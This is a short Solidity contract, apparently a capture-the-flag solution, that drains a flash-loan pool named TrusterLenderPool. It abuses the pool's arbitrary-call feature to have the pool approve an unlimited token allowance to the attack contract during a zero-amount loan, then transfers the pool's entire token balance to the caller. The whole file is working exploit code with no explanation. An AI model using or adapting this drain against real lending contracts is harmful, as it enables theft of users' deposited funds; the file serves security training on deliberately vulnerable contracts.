// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract TrusterLenderPoolAttack {
  function attack(address _target, address _token) public {
    uint approvalAmt = 0;
    unchecked {
      approvalAmt -= 1;
    }

    IERC20 token = IERC20(_token);
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), approvalAmt);

    TrusterLenderPool(_target).flashLoan(0, msg.sender, _token, data);
    token.transferFrom(_target, msg.sender, token.balanceOf(_target));
  }

}